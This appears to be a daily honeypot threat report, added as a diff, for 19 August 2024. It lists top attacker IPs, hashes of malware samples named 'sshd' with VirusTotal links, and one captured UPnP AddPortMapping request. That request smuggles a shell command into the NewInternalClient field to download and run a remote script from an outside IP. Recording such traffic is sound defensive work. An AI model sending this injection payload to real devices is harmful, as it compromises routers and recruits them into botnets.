@@ -1,0 +1,52 @@
+Top 5 IPs for 19-08-2024 :
+
+27.72.62.222
+43.128.116.7
+129.226.215.132
+198.46.207.98
+142.93.6.218
+
+
+Malware Observed:
+
+File name : sshd
+21811956167f72dcde22d8c16857cb63e0026c949dd1fcbb1f42d3943f5997dd
+https://www.virustotal.com/gui/file/21811956167f72dcde22d8c16857cb63e0026c949dd1fcbb1f42d3943f5997dd
+
+
+File name : sshd
+5490b3a2bb9fba5977d339f39396cdfe0e0cef66c10e11826c43169d6edc7a40
+https://www.virustotal.com/gui/file/5490b3a2bb9fba5977d339f39396cdfe0e0cef66c10e11826c43169d6edc7a40
+
+
+File name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+
+File name : sshd
+e2f4d712f1d1e71c785efdf61270faab95f13efc41e3a8e7c3112084d18f884b
+https://www.virustotal.com/gui/file/e2f4d712f1d1e71c785efdf61270faab95f13efc41e3a8e7c3112084d18f884b
+
+
+
+Commands/exploits observed
+
+
+POST /UD/?9 HTTP/1.1
+User-Agent: luna-owns-you
+Content-Type: text/xml
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47449</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`>/tmp/.e && cd /tmp; >/var/dev/.e && cd /var/dev; wget http://37.221.92.196/w.sh; chmod 777 w.sh; sh w.sh; rm w.sh;`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
+
+
+
+
+
+
+
+
+
+
+
